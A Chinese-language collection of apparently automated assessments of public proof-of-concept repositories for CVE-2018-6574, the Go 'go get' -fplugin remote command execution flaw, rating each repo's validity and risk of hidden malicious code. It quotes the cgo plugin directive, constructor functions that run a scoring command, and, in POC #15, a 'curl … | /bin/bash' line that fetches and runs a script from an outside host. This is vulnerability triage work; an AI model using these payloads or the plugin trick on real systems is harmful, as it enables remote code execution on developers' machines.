提供的POC代码本身不包含明显的投毒代码，它的目的是演示漏洞利用。`attack.so`的具体内容需要进一步分析才能确定是否存在恶意代码。根据目前的信息，POC代码的投毒风险评估为0%。`main.go`本身的功能是调用`attack.so`中的函数，并打印返回值。 如果`attack.so`存在后门,执行远程命令,则存在高危风险,但此部分分析应当基于其他辅助文件,本分析只针对`main.go`进行。

**利用方式分析：**
1.  攻击者创建一个包含恶意C代码插件（如`attack.so`）的Go代码仓库。
2.  攻击者在Go源代码中使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定该插件。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行`go get <attacker's repository>`命令。
4.  当Go编译受害者的代码时，会加载并执行`attack.so`中的恶意代码，从而实现远程命令执行。

**项目地址:** [YoussefSalama1/CVE-2018-6574](https://github.com/YoussefSalama1/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #7

**来源**: [CVE-2018-6574-adendarys_CVE-2018-6574.md](../2018/CVE-2018-6574-adendarys_CVE-2018-6574.md)

## CVE-2018-6574-Go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标系统使用受影响的Go版本，并执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 `go get` 命令中，由于未正确过滤 gcc/clang 的 `-fplugin` 和 `-plugin` 参数，攻击者可以通过构造恶意的 Go 包，在构建过程中执行任意命令。提供的POC代码包含一个 C 文件 (`attack.c`)，该文件编译后生成一个动态链接库 (`attack.so`)，其中包含一个 `malicious()` 函数，该函数在动态链接库加载时自动执行，从而执行系统命令 `/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752`。Go 代码 (`main.go`) 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令在编译时加载该动态链接库，从而触发恶意代码的执行。此POC有效，不存在明显的投毒代码，只是利用该漏洞执行预期的恶意行为。

**利用方式：**

1.  攻击者创建一个包含恶意 C 代码（如 `attack.c`）和 Go 代码（如 `main.go`）的 Go 包。
2.  `attack.c` 编译生成一个包含恶意指令的动态库。恶意指令可以是任意系统命令。
3.  Go 代码使用 `#cgo CFLAGS: -fplugin=./attack.so` 引入包含恶意指令的动态库。
4.  攻击者将该 Go 包发布到公共或私有仓库。
5.  受害者使用 `go get` 命令获取该 Go 包。
6.  在构建过程中，Go 编译器会执行 C 编译指令，加载恶意动态链接库，从而执行攻击者预设的恶意命令，导致远程命令执行。

**项目地址:** [adendarys/CVE-2018-6574](https://github.com/adendarys/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #8

**来源**: [CVE-2018-6574-antunesmpedro_CVE-2018-6574.md](../2018/CVE-2018-6574-antunesmpedro_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的 Go 版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过特制的 Go 代码仓库在目标系统上执行任意命令。当用户使用 `go get` 命令获取包含恶意代码的仓库时，Go 构建系统会执行仓库中嵌入的恶意指令。

**有效性：**

提供的 POC 代码是有效的。`exploit.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行一个命令，在本例中是调用 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，该指令指示 go 编译器将 `exploit.so` 编译为插件，并在程序运行时加载它。因为受影响的 Go 版本没有正确阻止 `-fplugin` 和 `-plugin` 参数，所以这允许执行 `exploit.c` 中的恶意代码。

**投毒风险：**

提供的代码片段本身没有明显的投毒行为。`exploit.c` 执行的命令 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`  可能用于完成漏洞利用挑战或者其他目的。该命令不是一个常见的恶意行为，因此不应将其判定为投毒。
整个代码仓库的投毒风险评估为 0%，因为提供的代码段没有任何恶意行为，并且没有迹象表明作者试图隐藏恶意代码。

**利用方式：**

1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 文件的 Go 代码仓库。
2.  `exploit.c` 文件包含需要在目标系统上执行的恶意代码。
3.  `main.go` 文件包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，从而利用漏洞。
4.  攻击者诱骗目标用户使用 `go get` 命令获取恶意仓库。
5.  当用户执行 `go get` 命令时，Go 构建系统会编译并加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。
6. 目标系统受到攻击，攻击者可以在目标系统上执行任意命令。

**项目地址:** [antunesmpedro/CVE-2018-6574](https://github.com/antunesmpedro/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #9

**来源**: [CVE-2018-6574-bme2003_CVE-2018-6574.md](../2018/CVE-2018-6574-bme2003_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且执行了`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行任意代码。漏洞原因是 Go 在构建源代码时，没有正确阻止 `-fplugin=` 和 `-plugin=` 参数，攻击者可以利用 gcc 或 clang 的插件功能执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的 Go 包，其中包含一个 `attack.c` 文件和一个 `main.go` 文件。
2.  `attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `system()` 函数执行任意命令。在给定的POC中，执行的命令是`/usr/local/bin/score a10c7b12-8910-4f65-8cd4-a6e57d90686b`。  这个命令很可能是用于提交漏洞利用结果的评分系统。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器将 `attack.c` 编译为共享库 `attack.so`，并将其作为插件加载。
4.  当用户使用 `go get` 命令获取该恶意包时，Go 编译器会自动编译并加载插件，从而执行 `malicious()` 函数中的恶意代码。

**有效性：**

提供的POC代码有效。`main.go`文件中的`// #cgo CFLAGS: -fplugin=./attack.so`指示了利用方式，即通过`go get`拉取代码时，会编译并加载`attack.so`，从而执行预设的恶意代码。

**投毒风险：**

分析POC代码后，没有发现明显的投毒代码。`attack.c` 中的 `system()` 函数执行的命令是明确的，该POC没有包含其他隐藏的恶意行为。因此，投毒风险评估为0%。虽然执行了恶意命令，但这属于漏洞验证所需的操作，不应被视为投毒。


**项目地址:** [bme2003/CVE-2018-6574](https://github.com/bme2003/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #10

**来源**: [CVE-2018-6574-chr1sM_CVE-2018-6574.md](../2018/CVE-2018-6574-chr1sM_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的Go版本，且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行过程中进行远程命令执行。漏洞原理是由于受影响的Go版本未正确过滤`-fplugin`和`-plugin`参数，攻击者可以构造包含恶意插件的Go项目，当用户使用`go get`获取并构建该项目时，恶意插件会被执行，从而实现远程命令执行。

**有效性评估：**
提供的PoC代码由两部分组成：`attack.c`和`golan.go`。`attack.c`包含一个`malicious()`函数，该函数使用`__attribute__((constructor))`修饰，表明该函数会在程序加载时自动执行。该函数的功能是执行`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`命令。`golan.go` 是一个简单的 Go 程序，它调用 C 代码。通过组合这两个文件，攻击者可以创建一个恶意的 Go 包，当用户使用易受攻击的 `go get` 版本获取该包时，`attack.c` 中的恶意代码将被编译并执行，从而导致命令执行。

**投毒风险评估：**
提供的代码片段中，`attack.c` 执行了一个特定的命令`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`，可以判定为漏洞验证代码，目的是为了验证漏洞是否存在。此命令本身可能与漏洞作者相关，但它不属于隐藏的、未公开的恶意行为，可以认为不存在投毒。因此投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的Go项目，其中包含`attack.c`和`golan.go`文件。
2.  `attack.c`包含恶意代码，例如执行任意命令。
3.  在Go项目的构建过程中，通过`-fplugin`或`-plugin`参数指定`attack.c`编译生成的插件。
4.  攻击者将恶意Go项目托管在公开的代码仓库中。
5.  诱导用户使用受影响的Go版本执行`go get`命令获取该恶意Go项目。
6.  当`go get`构建项目时，恶意插件会被加载并执行，从而实现远程命令执行。

**项目地址:** [chr1sM/CVE-2018-6574](https://github.com/chr1sM/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #11

**来源**: [CVE-2018-6574-currently-unkwn_CVE-2018-6574.md](../2018/CVE-2018-6574-currently-unkwn_CVE-2018-6574.md)

## CVE-2018-6574-Golang go get RCE

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Golang

**危害等级:** 高危，允许攻击者在受害者机器上执行任意命令

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标使用受影响的Golang版本，并且尝试使用`go get`命令获取包含恶意C代码的项目。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-6574漏洞允许攻击者通过`go get`命令执行远程代码。该漏洞源于Go语言在构建过程中未正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的GCC/Clang插件。攻击者可以构造包含恶意C代码的Go项目，当受害者使用`go get`命令获取该项目时，恶意代码会被编译并执行。

**有效性：**

提供的POC代码有效。`main.go`文件通过`// #cgo CFLAGS: -fplugin=./attack.so`指令指定了要加载的插件`attack.so`。`attack.so`文件（未提供，但推测是恶意payload）会被编译并加载，从而执行恶意代码。

**投毒风险：**

代码仓库中可能存在投毒代码的风险，但从给出的`main.go`和`README.md`内容来看，直接的投毒证据并不明显。`main.go`本身只是加载一个插件，恶意代码应该位于`attack.so`中，而这个文件并没有提供。 投毒风险评估为20%是因为攻击者可以将恶意 payload 隐藏在编译后的 `attack.so` 里, 用户下载后编译并不会感知恶意代码的存在, 存在一定风险。

**利用方式：**

1.  攻击者创建一个包含恶意C代码（编译为`.so`文件）的Go项目。
2.  Go项目的源码中，使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定要加载的恶意插件。
3.  攻击者将该项目托管在公共代码仓库（如GitHub）上。
4.  受害者使用`go get <attacker_repo>`命令尝试获取该项目。
5.  Go在构建项目时，会加载攻击者指定的恶意插件，从而在受害者机器上执行任意代码。
6.  防御措施包括升级到不受影响的Go版本，或配置Go工具链以禁止加载第三方插件。

**项目地址:** [currently-unkwn/CVE-2018-6574](https://github.com/currently-unkwn/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #12

**来源**: [CVE-2018-6574-elw0od_PentesterLab.md](../2018/CVE-2018-6574-elw0od_PentesterLab.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器使用受影响的Go版本，并尝试使用`go get`获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在 `go get` 命令执行期间利用 gcc 或 clang 插件功能执行远程命令。漏洞原因是 Go 语言未阻止 `-fplugin=` 和 `-plugin=` 参数。提供的POC代码包含一个 `attack.c` 文件，该文件定义了一个名为 `malicious` 的函数，该函数在库加载时自动执行，执行 `/usr/local/bin/score 42689c33-83ff-47d2-b538-ac6931adc5d3` 命令。`main.go` 文件使用 cgo 来编译和链接 `attack.c` 文件，并通过 `#cgo CFLAGS: -fplugin=./attack.so` 指定了 gcc 插件。当执行 `go get` 获取包含此代码的仓库时，`attack.so` 会被编译并加载，导致 `malicious` 函数执行。由于 POC 代码的功能是执行预期的后门命令，因此**没有证据表明存在额外的投毒代码**。POC 的意图是展示漏洞，而不是隐藏恶意行为。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在可公开访问的仓库中。
3.  攻击者诱使用户（开发者）使用受影响的 Go 版本执行 `go get <attacker_repo>` 命令。
4.  当 `go get` 执行时，cgo 编译并链接 `attack.c`，导致 `malicious` 函数执行，从而在目标机器上执行任意命令。


**项目地址:** [elw0od/PentesterLab](https://github.com/elw0od/PentesterLab)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #13

**来源**: [CVE-2018-6574-faiqu3_cve-2018-6574.md](../2018/CVE-2018-6574-faiqu3_cve-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响的Go版本，并执行`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过利用 `go get` 命令在构建源代码期间执行远程命令。该漏洞源于 Go 在处理 gcc 或 clang 插件特性时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意插件的 Go 包，并在该包的源码中指定使用该插件，当受害者使用 `go get` 获取并构建该包时，恶意插件将被加载和执行，从而实现远程命令执行。

**有效性：**
提供的POC代码看起来是有效的。`attack.c` 包含执行命令 `/usr/local/bin/score 3071f0cf-6174-4749-8ae3-fc6da33ec98b` 的恶意代码。`main.go` 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 go 编译器在构建时加载 `attack.so` 插件，从而执行 `attack.c` 中的恶意代码。`exploit.html` 可能是该漏洞的补充利用，通过打开一个URL，并向其postMessage，目的是为了触发漏洞利用。

**投毒风险：**
从提供的代码来看，不存在明显的投毒行为。`attack.c` 的目的明确是执行预定义的命令，这属于漏洞利用的一部分，而不是隐藏的恶意代码。`main.go` 明确指定加载该恶意插件。所以投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意插件的 Go 包（例如，`attack.c` 编译后的 `attack.so`）。
2.  攻击者创建一个 `main.go` 文件，其中使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令加载恶意插件。
3.  攻击者将该 Go 包托管在一个公开可访问的 Git 仓库或其他代码托管平台。
4.  攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意 Go 包。
5.  当受害者执行 `go get` 命令时，Go 编译器将加载并执行恶意插件，从而执行攻击者预先设定的命令。

**项目地址:** [faiqu3/cve-2018-6574](https://github.com/faiqu3/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #14

**来源**: [CVE-2018-6574-faqihudin13_CVE-2018-6574.md](../2018/CVE-2018-6574-faqihudin13_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过控制`go get`获取的代码仓库，利用gcc/clang插件机制注入恶意代码，从而在编译时执行任意命令。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目包含一个C文件 (`attack.c`) 和一个Go文件 (`main.go`)。
2.  `attack.c` 文件包含在编译时执行任意命令的代码。在这个例子中，它执行 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c`。这个命令可能用于漏洞评分或执行恶意操作。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 注释指示 `go` 编译器使用 `attack.c` 生成的插件。 这会强制 `go` 在构建过程中加载并执行该插件。
4.  当用户使用易受攻击的 Go 版本运行 `go get <attacker_repo>`时，`go` 命令会自动下载并构建恶意项目。
5.  由于 `-fplugin` 标志未被正确过滤，`go` 编译器将加载并执行恶意插件，从而在用户的系统上执行攻击者指定的任意命令。

**有效性评估：**

提供的PoC代码有效，它演示了如何在 `go get` 命令执行期间利用 gcc/clang 插件功能执行任意命令。

**投毒风险评估：**

在此特定仓库中，未发现明显的投毒代码。`attack.c` 中执行的命令 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c` 本身就是漏洞验证的一部分，旨在证明可以执行任意命令。没有迹象表明作者试图隐藏其他恶意代码或功能。因此，投毒风险评估为 0%。

**总结：**

该漏洞利用了 `go get` 命令在处理 gcc/clang 插件参数时的不当输入验证。攻击者可以通过创建一个包含恶意插件的Go项目来利用此漏洞，当用户使用易受攻击的Go版本获取并构建该项目时，该插件将被加载并执行，从而导致远程命令执行。

**项目地址:** [faqihudin13/CVE-2018-6574](https://github.com/faqihudin13/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #15

**来源**: [CVE-2018-6574-frozenkp_CVE-2018-6574.md](../2018/CVE-2018-6574-frozenkp_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #16

**来源**: [CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #17

**来源**: [CVE-2018-6574-iNoSec2_cve-2018-6574.md](../2018/CVE-2018-6574-iNoSec2_cve-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用go get命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者在受害者使用 `go get` 命令获取恶意 Go 包时执行任意代码。该漏洞的根源在于 `go get` 命令在构建过程中没有正确过滤 gcc/clang 的插件参数，导致攻击者可以通过 `-fplugin=` 或 `-plugin=` 参数指定恶意插件，从而执行任意代码。

**有效性：**

提供的 POC 代码是有效的，它通过创建一个包含恶意 C 代码（`2018.c`）的 Go 包来实现远程代码执行。恶意 C 代码使用 `__attribute__((constructor))` 在库加载时自动执行 `malicious()` 函数，该函数执行 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建时加载 `attack.so` 插件（通过编译 `2018.c` 得到）。

**投毒风险：**

该POC代码本身就是一个漏洞演示，旨在展示如何利用该漏洞执行任意命令。`2018.c` 中执行的 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令是预期的payload。该代码仓库的目的是演示漏洞，而不是为了植入后门。因此投毒风险评估为0%。

**利用方式：**

1.  **创建恶意Go包:** 攻击者创建一个包含恶意 C 代码和 Go 代码的 Go 包。恶意 C 代码编译成一个共享库（`attack.so`）。
2.  **上传恶意Go包:** 攻击者将恶意 Go 包上传到公共代码托管平台（如 GitHub）。
3.  **诱骗受害者:** 攻击者诱骗受害者使用 `go get` 命令获取恶意 Go 包。
4.  **执行恶意代码:** 当受害者使用 `go get` 命令获取恶意 Go 包时，Go 编译器会加载恶意共享库，并执行其中的恶意代码。

**缓解措施：**

*   升级 Go 版本到受影响版本之外（>= 1.8.7, >= 1.9.4, >= 1.10rc2）。
*   避免使用来自不受信任来源的 Go 包。


**项目地址:** [iNoSec2/cve-2018-6574](https://github.com/iNoSec2/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #18

**来源**: [CVE-2018-6574-jahwni_CVE-2018-6574.md](../2018/CVE-2018-6574-jahwni_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令来获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程代码。攻击者可以创建一个包含恶意代码的Go包，并将该包托管在公开的存储库中。当受害者使用 `go get` 命令获取该包时，恶意代码将在构建过程中执行。利用方式为在包中利用 gcc 或 clang 的插件功能（`-fplugin=` 或 `-plugin=` 参数），在编译时执行任意命令。

提供的PoC代码包含两个文件：`attack.c` 和 `main.go`。
*   `attack.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 356f5d20-43e8-4a8c-b024-f1e42ec7f7f5`。`__attribute__((constructor))` 确保 `malicious` 函数在共享库加载时自动执行。
*   `main.go` 文件使用 cgo 特性。`// #cgo CFLAGS: -fplugin=./attack.so`  指示 `go` 编译器在构建过程中将 `attack.so` 作为 gcc/clang 插件加载。由于 `attack.so` 包含 `malicious` 函数，因此当 `go get` 获取并构建这个包时，`malicious` 函数将被执行，从而实现远程命令执行。

有效性：提供的PoC代码是有效的，如果目标Go版本存在漏洞，则可以成功执行任意命令。

投毒风险：提供的 PoC 仅仅是漏洞演示，执行了一个固定的命令。从提供的 `attack.c` 和 `main.go` 代码来看，并没有发现隐藏的、额外的恶意代码或者后门。作者意图是演示漏洞，而不是进行恶意攻击，风险较低。

利用方式：
1.  攻击者创建一个包含恶意代码的Go包，如提供的PoC代码。
2.  攻击者将该包托管在公开的存储库中。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行 `go get <attacker_repo>` 命令来获取该包。
4.  当受害者执行 `go get` 命令时，恶意代码将在构建过程中执行，从而实现远程命令执行。

**项目地址:** [jahwni/CVE-2018-6574](https://github.com/jahwni/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #19

**来源**: [CVE-2018-6574-jftierno_-CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_-CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的 Go 版本，并且运行 `go get` 获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。具体利用方式如下：

1.  **攻击者创建恶意 Go 包：** 攻击者创建一个包含恶意代码的 Go 包，利用 gcc 或 clang 插件特性。 在提供的POC代码中,attack.c 文件定义了一个 `malicious()` 函数，该函数被声明为 `__attribute__((constructor))`，这意味着它会在程序加载时自动执行。该函数会执行 `system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1")` 命令。这表明攻击者试图执行一个特定的程序 `/usr/local/bin/score`，并传递一个特定的ID作为参数。

2.  **诱导受害者获取恶意包：** 攻击者诱导受害者使用 `go get` 命令获取该恶意包。这可以通过多种方式实现，例如通过社会工程学攻击，或者将恶意包伪装成有用的工具库。

3.  **构建时执行恶意代码：** 当受害者使用 `go get` 命令获取并构建恶意包时，Go 会调用 gcc 或 clang 来编译代码。由于存在漏洞，Go 没有正确地过滤 `-fplugin=` 和 `-plugin=` 参数，导致 gcc 或 clang 加载并执行攻击者提供的恶意插件，从而执行攻击者预先设定的恶意代码。

**有效性分析：**
